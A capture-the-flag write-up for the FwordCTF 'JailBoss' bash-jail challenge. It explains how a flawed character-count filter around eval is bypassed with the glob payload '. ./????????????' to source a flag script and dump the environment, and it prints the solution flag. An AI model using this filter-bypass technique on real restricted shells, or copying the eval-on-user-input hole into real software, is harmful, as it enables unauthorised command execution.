# JailBoss
You are provided with an SSH account to server `ssh -p 2222 ctf@jailboss.fword.wtf`, and 2 files.

## `taskFword.sh`
```sh
#!/bin/bash
export FLAG="FwordCTF{REDACTED}"
echo "A useless script for a useless SysAdmin"
```

## `jail.sh`
```sh
#!/bin/bash
figlet "BASH JAIL x Fword"
echo "Welcome! Kudos to Anis_Boss Senpai"
function a(){
/usr/bin/env
}
export -f a
function calculSlash(){
	echo $1|grep -o "/"|wc -l
}
function calculPoint(){
	echo $1|grep -o "."|wc -l
}
function calculA(){
        echo $1|grep -o "a"|wc -l
}

while true;do
read -p ">> " input ;
if echo -n "$input"| grep -v -E "^(\.|\/| |\?|a)*$" ;then
        echo "No No not that easy "
else
	pts=$(calculPoint $input)
	slash=$(calculSlash $input)
	nbA=$(calculA $input)
	if [[ $pts -gt 2 || $slash -gt 1 || $nbA -gt 1 ]];then
		echo "That's Too much"
	else
		eval "$input"
	fi
fi
done
```

When you connect to remote server you are greeted with

```
 _____                       _ 
|  ___|_      _____  _ __ __| |
| |_  \ \ /\ / / _ \| '__/ _` |
|  _|  \ V  V / (_) | | | (_| |
|_|     \_/\_/ \___/|_|  \__,_|
                               
ctf@jailboss.fword.wtf's password: 

DISCLAIMER: Please don't abuse the server or you will get banned !

Author: Kahla, Contact me for any problems; GL & HF

 ____    _    ____  _   _       _   _    ___ _            
| __ )  / \  / ___|| | | |     | | / \  |_ _| |     __  __
|  _ \ / _ \ \___ \| |_| |  _  | |/ _ \  | || |     \ \/ /
| |_) / ___ \ ___) |  _  | | |_| / ___ \ | || |___   >  < 
|____/_/   \_\____/|_| |_|  \___/_/   \_\___|_____| /_/\_\
                                                          
 _____                       _ 
|  ___|_      _____  _ __ __| |
| |_  \ \ /\ / / _ \| '__/ _` |
|  _|  \ V  V / (_) | | | (_| |
|_|     \_/\_/ \___/|_|  \__,_|
                               
Welcome! Kudos to Anis_Boss Senpai
>> 
```

And you can input commands.
We can assume that `jail.sh` is ran after connecting to server and that `taskFword.sh` is probably in the same directory.

## Method
1. Find a way to execute `taskFword.sh` to load flag to ENV
2. Call a() to execute /usr/bin/env (where already loaded flag resides)

## The script
We can see that the script asks for input.
```sh
read -p ">> " input ;
```

Then script checks if out input consists only of certain characters `.` `/` `:space:` `?` `a`
Those are only allowed characters.
```sh
if echo -n "$input"| grep -v -E "^(\.|\/| |\?|a)*$" ;then
```

Then we use defined functions
```sh
function calculSlash(){
	echo $1|grep -o "/"|wc -l
}
function calculPoint(){
	echo $1|grep -o "."|wc -l
}
function calculA(){
	echo $1|grep -o "a"|wc -l
}
```

to find out number of appereances of characters `/` `.` `a`
Notice how the script is not checking counts of `:space:` or `?`
```sh
pts=$(calculPoint $input)
slash=$(calculSlash $input)
nbA=$(calculA $input)
```

Then we check number of appereances.
We can you maximum of 2x`.`, 1x`/` and 1x`a`
```sh
if [[ $pts -gt 2 || $slash -gt 1 || $nbA -gt 1 ]];then
```

If the condition is satisfied, script calls `eval` with our input.
This is a dangerous builtin command that shouldn't be used with user input.
We can potentionaly run "any" command we want with this
```sh
eval "$input"
```

## Exploit
How can we execute a command only with these characters `.` `/` `:space:` `?` `a`
We can't do `./taskFword.sh` because there are banned characters.
What we can do is use regex symbol `?` which is a substitute for a single character.
If you don't understand regex read about it. (You have probably used commands like `rm *`, `*` is a regex symbol meaning 'everything').

So we can try:
`./????????????`
which can resolve to
`./taskFword.sh`

Here is a catch.
When scripts evaluates function
```sh
function calculPoint(){
	echo $1|grep -o "."|wc -l
}
```
with our input `./????????????` it checks for occurence of `.` which in regex means 'any character'. So the function 'returns' count `14` since we used 14 characters as our input, which stops us from evaluating our input since we are allowed to use 2 **dots** (`.`).
How can we solve this?

The solution is in
```sh
pts=$(calculPoint $input)
```
and respective
```sh
function calculPoint(){
	echo $1|grep -o "."|wc -l
}
```

The function only evaluates the first argument `$1` from our input (which was our entire input string so far). But we can use `:space:` to divide our input into 2 words. First word can be `.` which evaluates to count `1` since we only used 1 character and second word can be our payload `./????????????`.

Together
`. ./????????????`

This input successfuly satisfies all conditions. And bash interpreter evaluates first `.` as **dot command** (command that evaluates commands in the current execution context) and then executes the scripts that loads the FLAG into our ENVIROMENT.

## In action
```
>> . ./????????????
A useless script for a useless SysAdmin
```

Then we can simply invoke function a() to print our ENVIROMENT
```
>> a
SHELL=/opt/jail.sh
PWD=/home/ctf
LOGNAME=ctf
MOTD_SHOWN=pam
HOME=/home/ctf/
LANG=en_US.UTF-8
FLAG=FwordCTF{BasH_1S_R3aLLy_4w3s0m3_K4hLaFTW}
TERM=xterm-256color
USER=ctf
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
SSH_TTY=/dev/pts/2
BASH_FUNC_a%%=() {  /usr/bin/env
}
_=/usr/bin/env
```

## The Flag
**FwordCTF{BasH_1S_R3aLLy_4w3s0m3_K4hLaFTW}**
